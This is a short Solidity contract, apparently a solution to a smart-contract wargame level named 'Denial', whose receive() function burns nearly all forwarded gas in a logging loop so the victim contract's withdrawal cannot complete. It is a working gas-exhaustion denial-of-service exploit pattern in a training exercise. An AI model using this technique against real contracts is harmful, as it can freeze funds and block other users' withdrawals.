// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/console.sol";
import "instances/20_Denial.sol";

contract AttackerDenial {
    uint256 private loop;

    receive() external payable {
        uint256 gas;
        do {
            gas = gasleft();
            console.log("loop #", loop++, "gasleft", gas);
        } while (gas > 8000);
    }
}
